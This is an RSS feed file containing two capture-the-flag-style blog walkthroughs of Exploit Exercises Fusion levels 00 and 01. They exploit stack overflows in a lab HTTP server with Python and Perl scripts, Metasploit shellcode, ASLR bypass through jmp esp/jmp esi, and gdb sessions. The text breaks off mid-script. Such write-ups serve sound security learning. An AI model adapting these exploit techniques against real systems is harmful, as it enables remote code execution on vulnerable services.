@@ -1,0 +1,517 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Fusion on Matt Andreko</title>
+    <link>https://www.mattandreko.com/categories/fusion/index.xml</link>
+    <description>Recent content in Fusion on Matt Andreko</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-US</language>
+    <atom:link href="https://www.mattandreko.com/categories/fusion/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Exploit Exercises - Fusion 01</title>
+      <link>https://www.mattandreko.com/blog/2012-07-03-exploit-exercises-fusion-01/</link>
+      <pubDate>Tue, 03 Jul 2012 17:19:00 -0400</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-07-03-exploit-exercises-fusion-01/</guid>
+      <description>&lt;p&gt;It&amp;rsquo;s been a while since I last did a write-up about &lt;a href=&#34;http://www.exploit-exercises.com&#34;&gt;Exploit Exercises&lt;/a&gt;. I&amp;rsquo;m starting to look back at it now, since I have some more free time again. I&amp;rsquo;ve now, as I&amp;rsquo;m sure you can guess by the title of this post, solved level 01.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;So &lt;a href=&#34;http://exploit-exercises.com/fusion/level01&#34;&gt;this level&lt;/a&gt; is very similar to the first, except that it has ASLR and doesn&amp;rsquo;t tell us where the buffer is on every execution. Even if it did tell us, due to the ASLR, it very well may change every time it&amp;rsquo;s executed.  Based on this information, I went down the road of using a ret2reg method.&lt;/p&gt;
+
+&lt;p&gt;So let&amp;rsquo;s start with the code we used on level 00, but change the comments and port numbers to be more appropriate:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Fusion Level 01
+# http://exploit-exercises.com/fusion/level01
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from sys import exit
+from struct import pack
+from optparse import OptionParser
+from socket import *
+
+def exploit(hostname, port):
+        junk = &amp;quot;A&amp;quot;*139
+        ret = pack(&amp;quot;&amp;amp;lt;I&amp;quot;, 0xbffff999)
+        nops = &amp;quot;\x90&amp;quot;*100
+        shellcode = &amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0f\x00\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x70\x6f\x6f\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;
+
+        s = socket(AF_INET, SOCK_STREAM)
+        try:
+                print &amp;quot;[*] Connecting to %s on port %s&amp;quot; % (hostname, port)
+                s.connect((hostname, port))
+        except:
+                print &amp;quot;[*] Connection error&amp;quot;
+                exit(1)
+
+        print s.recv(1024)
+        s.send(&amp;quot;GET /&amp;quot; + junk + ret + &amp;quot; HTTP/1.1\n&amp;quot; + nops + shellcode)
+
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;,
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=20001,
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+
+    exploit(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now to start out, let&amp;rsquo;s generate some new shellcode, to touch a file in /tmp:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/opt/metasploit-framework$ ./msfpayload linux/x86/exec CMD=&amp;quot;touch /tmp/level01&amp;quot; C
+/*
+* linux/x86/exec - 54 bytes
+* http://www.metasploit.com
+* VERBOSE=false, PrependSetresuid=false,
+* PrependSetreuid=false, PrependSetuid=false,
+* PrependChrootBreak=false, AppendExit=false, CMD=touch
+* /tmp/level01
+*/
+unsigned char buf[] =
+&amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68&amp;quot;
+&amp;quot;\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x13\x00\x00\x00\x74&amp;quot;
+&amp;quot;\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x65\x76\x65\x6c&amp;quot;
+&amp;quot;\x30\x31\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now to debug, let&amp;rsquo;s change the return address to 0xDEADBEEF to generate an error, since we no longer know where the buffer will be.  I also removed the &amp;ldquo;/&amp;rdquo; after the &amp;ldquo;GET&amp;rdquo;, as well as the &amp;ldquo;\n&amp;rdquo; after the &amp;ldquo;HTTP/1.1&amp;rdquo; since they&amp;rsquo;re really just junk getting in the way.  Additionally, since the buffer isn&amp;rsquo;t being printed to the screen, the &amp;ldquo;recv(1024)&amp;rdquo; code needed to be removed so the program didn&amp;rsquo;t wait for it.&lt;/p&gt;
+
+&lt;p&gt;Now, our codebase looks like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Fusion Level 01
+# http://exploit-exercises.com/fusion/level01
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from sys import exit
+from struct import pack
+from optparse import OptionParser
+from socket import *
+
+def exploit(hostname, port):
+        junk = &amp;quot;A&amp;quot;*139
+        ret = pack(&amp;quot;&amp;amp;lt;I&amp;quot;, 0xDEADBEEF)
+        nops = &amp;quot;\x90&amp;quot;*100
+        shellcode = (&amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68&amp;quot;
+&amp;quot;\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x13\x00\x00\x00\x74&amp;quot;
+&amp;quot;\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x65\x76\x65\x6c&amp;quot;
+&amp;quot;\x30\x31\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;)
+
+        s = socket(AF_INET, SOCK_STREAM)
+        try:
+                print &amp;quot;[*] Connecting to %s on port %s&amp;quot; % (hostname, port)
+                s.connect((hostname, port))
+        except:
+                print &amp;quot;[*] Connection error&amp;quot;
+                exit(1)
+
+        s.send(&amp;quot;GET &amp;quot; + junk + ret + &amp;quot; HTTP/1.1&amp;quot; + nops + shellcode)
+
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;,
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=20001,
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+
+    exploit(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As expected, when it was ran, it crashed, and dumped a core.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:~$ ./level01.py
+[*] Connecting to 127.0.0.1 on port 20001
+fusion@fusion:~$ ls /tmp
+core-level01-11-20001-20001-2222-1341317061
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So I loaded it into gdb to look at the dump.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:~$ sudo gdb -q --core=/tmp/core-level01-11-20001-20001-2222-1341317061
+[New LWP 2222]
+Core was generated by `/opt/fusion/bin/level01&#39;.
+Program terminated with signal 11, Segmentation fault.
+#0  0xdeadbeef in ?? ()
+(gdb) i r
+eax            0x1      1
+ecx            0xb772d8d0       -1217210160
+edx            0xbfa65d90       -1079616112
+ebx            0xb78a5ff4       -1215668236
+esp            0xbfa65d90       0xbfa65d90
+ebp            0x41414141       0x41414141
+esi            0xbfa65e44       -1079615932
+edi            0x8049ed1        134520529
+eip            0xdeadbeef       0xdeadbeef
+eflags         0x10246  [ PF ZF IF RF ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Initially, this shows that our return address did get hit successfully, since &amp;ldquo;0xdeadbeef&amp;rdquo; is the overwritten EIP. I then started exploring each of the registers to see if there was anything of interest.  I found that my shellcode was actually being stored in the esi register, or at least the start of the nop-sled was:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb) x/10x $esi
+0xbfa65e44:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfa65e54:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfa65e64:     0x90909090      0x90909090
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I immediately thought this was going to be the end of the challenge, since I could just &amp;lsquo;jmp esi&amp;rsquo;.  However, when looking for that opcode, I couldn&amp;rsquo;t find it:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/opt/metasploit-framework$ ./msfelfscan -j esi /opt/fusion/bin/level01
+[/opt/fusion/bin/level01]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Trying to find another way, I looked at the stack pointer, with a little extra surrounding it to see what&amp;rsquo;s on each side:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;(gdb)  x/16x $esp-16
+0xbfa65d80:     0x41414141      0x41414141      0x41414141      0xdeadbeef
+0xbfa65d90:     0xbfa65d00      0x00000020      0x00000004      0x00000000
+0xbfa65da0:     0x001761e4      0xbfa65e30      0x20544547      0x41414141
+0xbfa65db0:     0x41414141      0x41414141      0x41414141      0x41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So if our stack pointer is at 0xbfa65d90, the byte right after our return (0xdeadbeef), then we could return to the esp, and then redirect to the esi!  Let&amp;rsquo;s test this by changing the return address to a &amp;lsquo;jmp esp&amp;rsquo;, and making the next byte a debug opcode to halt the program.&lt;/p&gt;
+
+&lt;p&gt;Luckily this time we have a valid address for our register:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/opt/metasploit-framework$ ./msfelfscan -j esp /opt/fusion/bin/level01
+[/opt/fusion/bin/level01]
+0x08049f4f jmp esp
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;So now our code looks like this:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Fusion Level 01
+# http://exploit-exercises.com/fusion/level01
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from sys import exit
+from struct import pack
+from optparse import OptionParser
+from socket import *
+
+def exploit(hostname, port):
+        junk = &amp;quot;A&amp;quot;*139
+        ret = pack(&amp;quot;&amp;lt;I&amp;quot;, 0x08049f4f)
+        esi = &amp;quot;\xCC&amp;quot;
+        nops = &amp;quot;\x90&amp;quot;*100
+        shellcode = (&amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68&amp;quot;
+&amp;quot;\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x13\x00\x00\x00\x74&amp;quot;
+&amp;quot;\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x65\x76\x65\x6c&amp;quot;
+&amp;quot;\x30\x31\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;)
+
+        s = socket(AF_INET, SOCK_STREAM)
+        try:
+                print &amp;quot;[*] Connecting to %s on port %s&amp;quot; % (hostname, port)
+                s.connect((hostname, port))
+        except:
+                print &amp;quot;[*] Connection error&amp;quot;
+                exit(1)
+
+        s.send(&amp;quot;GET &amp;quot; + junk + ret + esi + &amp;quot; HTTP/1.1&amp;quot; + nops + shellcode)
+
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;,
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=20001,
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+
+    exploit(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Once it&amp;rsquo;s executed, I load it into gdb again to poke around.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:~$ ./level01.py
+[*] Connecting to 127.0.0.1 on port 20001
+fusion@fusion:~$ ls /tmp
+core-level01-5-20001-20001-2353-1341318366
+fusion@fusion:~$ sudo gdb -q --core=/tmp/core-level01-5-20001-20001-2353-1341318366
+[New LWP 2353]
+Core was generated by `/opt/fusion/bin/level01&#39;.
+Program terminated with signal 5, Trace/breakpoint trap.
+#0  0xbfa65d91 in ?? ()
+(gdb) x/16x $esp-16
+0xbfa65d80:     0x41414141      0x41414141      0x41414141      0x08049f4f
+0xbfa65d90:     0xbfa600cc      0x00000020      0x00000004      0x00000000
+0xbfa65da0:     0x001761e4      0xbfa65e30      0x20544547      0x41414141
+0xbfa65db0:     0x41414141      0x41414141      0x41414141      0x41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Well it looks like it hit our debug point.  Let&amp;rsquo;s try replacing the &amp;ldquo;\xCC&amp;rdquo; with the opcodes for &amp;ldquo;jmp esi&amp;rdquo;.  But first we have to find what that opcode actually is.  I found a decent enough method for now on &lt;a href=&#34;http://stackoverflow.com/questions/3206535/dos-debug-like-program-for-32-bit-x86-assembly&#34;&gt;stackoverflow&lt;/a&gt;, which I modified a little for my needs. I&amp;rsquo;d like to find something better for the future though.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:~$ echo -e &amp;quot;BITS 32\njmp esi&amp;quot; &amp;gt; tmp.S &amp;amp;&amp;amp; nasm tmp.S -o tmp.o &amp;amp;&amp;amp; ndisasm -b 32 tmp.o &amp;amp;&amp;amp; rm -f tmp.o tmp.S
+00000000  FFE6              jmp esi
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Since this is a 2 byte instruction, we will need to pad the end of it to 4 bytes, to align it properly.  I simply used &amp;ldquo;\x90&amp;rdquo; nops to do so, giving us the value &amp;ldquo;0x9090E6FF&amp;rdquo;.&lt;/p&gt;
+
+&lt;p&gt;That leaves us with the final code:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Fusion Level 01
+# http://exploit-exercises.com/fusion/level01
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from sys import exit
+from struct import pack
+from optparse import OptionParser
+from socket import *
+
+def exploit(hostname, port):
+        junk = &amp;quot;A&amp;quot;*139
+        ret = pack(&amp;quot;&amp;lt;I&amp;quot;, 0x08049f4f)
+        esi = pack(&amp;quot;&amp;lt;I&amp;quot;, 0x9090E6FF)
+        nops = &amp;quot;\x90&amp;quot;*100
+        shellcode = (&amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68&amp;quot;
+&amp;quot;\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x13\x00\x00\x00\x74&amp;quot;
+&amp;quot;\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x65\x76\x65\x6c&amp;quot;
+&amp;quot;\x30\x31\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;)
+
+        s = socket(AF_INET, SOCK_STREAM)
+        try:
+                print &amp;quot;[*] Connecting to %s on port %s&amp;quot; % (hostname, port)
+                s.connect((hostname, port))
+        except:
+                print &amp;quot;[*] Connection error&amp;quot;
+                exit(1)
+
+        s.send(&amp;quot;GET &amp;quot; + junk + ret + esi + &amp;quot; HTTP/1.1&amp;quot; + nops + shellcode)
+
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;,
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=20001,
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+
+    exploit(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now if we execute our exploit, it works just fine, bypassing ASLR and everything.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:~$ ls -al /tmp
+fusion@fusion:~$ ./level01.py
+[*] Connecting to 127.0.0.1 on port 20001
+fusion@fusion:~$ ls -al /tmp
+total 8
+drwxrwxrwt  2 root  root  4096 2012-07-03 23:32 .
+drwxr-xr-x 22 root  root  4096 2012-05-07 21:53 ..
+-rw-r--r--  1 20001 20001    0 2012-07-03 23:32 level01
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There you have it. Our shellcode to &amp;ldquo;touch /tmp/level01&amp;rdquo; executed as the uid 20001.  That shellcode could then be replaced with something more malicious (read: meterpreter/bindshell) if desired.  But for PoC, that works.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Fusion 00</title>
+      <link>https://www.mattandreko.com/blog/2012-04-09-exploit-exercises-fusion-00/</link>
+      <pubDate>Mon, 09 Apr 2012 17:13:00 -0400</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2012-04-09-exploit-exercises-fusion-00/</guid>
+      <description>&lt;p&gt;I was very excited to see the announcement on twitter, that &lt;a href=&#34;http://exploit-exercises.com/fusion&#34;&gt;Fusion&lt;/a&gt; was going to be released, even if it&amp;rsquo;s just the first 10 levels. I was a bit bummed, as I didn&amp;rsquo;t think I&amp;rsquo;d get to work on it much, until I complete &lt;a href=&#34;http://www.offensive-security.com/online-information-security-training/penetration-testing-backtrack/&#34;&gt;PWB&lt;/a&gt;, but I managed to find a little time to at least start it. I pulled up &lt;a href=&#34;http://exploit-exercises.com/fusion/level00&#34;&gt;level 00&lt;/a&gt;, which looks to be a basic stack overflow in an http server.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;The code for the server is below:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot; 
+
+int fix_path(char *path)
+{
+ char resolved[128];
+
+ if(realpath(path, resolved) == NULL) return 1; // can&#39;t access path. will error trying to open
+ strcpy(path, resolved);
+}
+
+char *parse_http_request()
+{
+ char buffer[1024];
+ char *path;
+ char *q;
+
+ printf(&amp;quot;[debug] buffer is at 0x%08x :-)\n&amp;quot;, buffer);
+
+ if(read(0, buffer, sizeof(buffer)) &amp;lt;= 0) errx(0, &amp;quot;Failed to read from remote host&amp;quot;);
+ if(memcmp(buffer, &amp;quot;GET &amp;quot;, 4) != 0) errx(0, &amp;quot;Not a GET request&amp;quot;);
+
+ path = &amp;amp;buffer[4];
+ q = strchr(path, &#39; &#39;);
+ if(! q) errx(0, &amp;quot;No protocol version specified&amp;quot;);
+ *q++ = 0;
+ if(strncmp(q, &amp;quot;HTTP/1.1&amp;quot;, 8) != 0) errx(0, &amp;quot;Invalid protocol&amp;quot;);
+
+ fix_path(path);
+
+ printf(&amp;quot;trying to access %s\n&amp;quot;, path);
+
+ return path;
+}
+
+int main(int argc, char **argv, char **envp)
+{
+ int fd;
+ char *p;
+
+ background_process(NAME, UID, GID); 
+ fd = serve_forever(PORT);
+ set_io(fd);
+
+ parse_http_request(); 
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I initially had to read through the code a few times to figure out where the overflow was, to be quite honest. When an HTTP request comes in, it goes to the &amp;ldquo;parse_http_request&amp;rdquo; method. From there, it reads the buffr in by using the &amp;ldquo;read&amp;rdquo; method. Unfortunately for us, it is being careful to only read in as many bytes as it can put into the buffer.  It then does some basic handling to parse out the request.  It verifies that it was a &amp;ldquo;GET&amp;rdquo; request, and that it was done using HTTP/1.1. After that, it will pass the path of the URI to &amp;ldquo;fix_path&amp;rdquo;. In this method, there &lt;i&gt;IS&lt;/i&gt; an overflow, since the &amp;ldquo;resolved&amp;rdquo; variable has 128 bytes to hold data, but there is no checking of size when the &amp;ldquo;strcpy&amp;rdquo; is done.&lt;/p&gt;
+
+&lt;p&gt;I logged into the machine, and made sure that I could actually get a core dump to be created if the process had an exception.  To do this, I changed the core settings for my user:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ ulimit -c unlimited
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Based on my analysis, I knew I would be overflowing the URI path, but based on the note given to me, I would put my shellcode after the &amp;ldquo;HTTP/1.1&amp;rdquo; since there was a lot more room.  However, I didn&amp;rsquo;t know the EIP offset. So I generated a quick MSF pattern on another machine:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_create.rb 200
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then started to wire up an exploit like so:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ perl -e &#39;print &amp;quot;GET /&amp;quot;. &amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&amp;quot; . &amp;quot;\x99\xf9\xff\xbf&amp;quot; . &amp;quot; HTTP/1.1\n&amp;quot; . &amp;quot;\x90&amp;quot;x100 . &amp;quot;\xcc&amp;quot;x100&#39; | nc localhost 20000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Note that the &amp;ldquo;\x99\xf9\xff\xbf&amp;rdquo; value was simply guessed by taking the buffer offset (conveniently given to us at runtime) of &amp;ldquo;0xbffff8f8&amp;rdquo;, and adding to it enough bytes for the &amp;ldquo;GET&amp;rdquo;, the MSF buffer, and the &amp;ldquo;HTTP/1.1&amp;rdquo;. I had played previously by hand, and knew how long the buffer would be, so I didn&amp;rsquo;t need to break this into 2 steps.&lt;/p&gt;
+
+&lt;p&gt;After executing the command, I found a handy &amp;ldquo;core&amp;rdquo; file in the root directory. So I loaded it up in GDB to get the offset:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ sudo gdb --core=/core --quiet
+[New LWP 2280]
+Core was generated by `/opt/fusion/bin/level00&#39;.
+Program terminated with signal 11, Segmentation fault.
+#0  0x65413665 in ?? ()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, I took that EIP value, and ran it through the MSF Pattern Offset calculator:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_offset.rb 0x65413665
+139
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This was convenient enough to let me know that the first 139 bytes were junk, but then I had direct access to the EIP. If my estimate for a return address was close enough to hit a nop sled, it would then hit the &amp;ldquo;\xcc&amp;rdquo; debug/trace point. I then tested that:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ perl -e &#39;print &amp;quot;GET /&amp;quot;. &amp;quot;A&amp;quot;x139 . &amp;quot;\x99\xf9\xff\xbf&amp;quot; . &amp;quot; HTTP/1.1\n&amp;quot; . &amp;quot;\x90&amp;quot;x100 . &amp;quot;\xcc&amp;quot;x100&#39; | nc localhost 20000
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;When I loaded the new core file into GDB, I saw that it indeed hit the debug trap:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ sudo gdb --core=/core --quiet
+[New LWP 2310]
+Core was generated by `/opt/fusion/bin/level00&#39;.
+Program terminated with signal 5, Trace/breakpoint trap.
+#0  0xbffff9fb in ?? ()
+(gdb) x/10x $eip
+0xbffff9fb:     0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc
+0xbffffa03:     0xcc    0xcc
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The next step was to generate some shellcode.   verified that the process was running as a UID of 20000, and not SUID, so I&amp;rsquo;m guessing at the end result here. The challenge to me was actually getting the exploit to work, so what the shellcode did was not a big event for me.  I decided to just make it write a file to /tmp. This could however be adapted to anything else.&lt;/p&gt;
+
+&lt;p&gt;I used Metasploit&amp;rsquo;s MSFVenom tool to generate me some shellcode to &amp;ldquo;touch /tmp/poo&amp;rdquo; as a test:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfvenom -p linux/x86/exec -f pl CMD=&amp;quot;touch /tmp/poo&amp;quot;
+my $buf =
+&amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73&amp;quot; .
+&amp;quot;\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0f\x00\x00&amp;quot; .
+&amp;quot;\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x70\x6f&amp;quot; .
+&amp;quot;\x6f\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then plugged that shellcode into my exploit:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ perl -e &#39;print &amp;quot;GET /&amp;quot;. &amp;quot;A&amp;quot;x139 . &amp;quot;\x99\xf9\xff\xbf&amp;quot; . &amp;quot; HTTP/1.1\n&amp;quot; . &amp;quot;\x90&amp;quot;x100 . &amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0f\x00\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x70\x6f\x6f\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;&#39; | nc localhost 20000
+[debug] buffer is at 0xbffff8f8 :-)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lastly, I verified that it did run the shellcode:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ ls -al /tmp
+total 8
+drwxrwxrwt  2 root  root  4096 2012-04-09 21:25 .
+drwxr-xr-x 22 root  root  4096 2012-04-09 21:22 ..
+-rw-r--r--  1 20000 20000    0 2012-04-09 21:25 poo
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;There you have it, successful exploitation, using very basic methods. This one felt very much like the first day back from summer break, but I&amp;rsquo;m guessing it&amp;rsquo;ll get much harder quickly.&lt;/p&gt;
+
+&lt;p&gt;UPDATE 5/7/2012: Added python exploit:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# Fusion Level 00
+# http://exploit-exercises.com/fusion/level00
+# Matt Andreko
+# twitter: @mandreko
+# contact: matt [at] mattandreko.com
+
+from sys import exit
+from struct import pack
+from optparse import OptionParser
+from socket import *
+
+def exploit(hostname, port):
+        junk = &amp;quot;A&amp;quot;*139
+        ret = pack(&amp;quot;&amp;lt;I&amp;quot;, 0xbffff999)
+        nops = &amp;quot;\x90&amp;quot;*100
+        shellcode = &amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0f\x00\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x70\x6f\x6f\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;
+
+        s = socket(AF_INET, SOCK_STREAM)
+        try:
+                print &amp;quot;[*] Connecting to %s on port %s&amp;quot; % (hostname, port)
+                s.connect((hostname, port))
+        except:
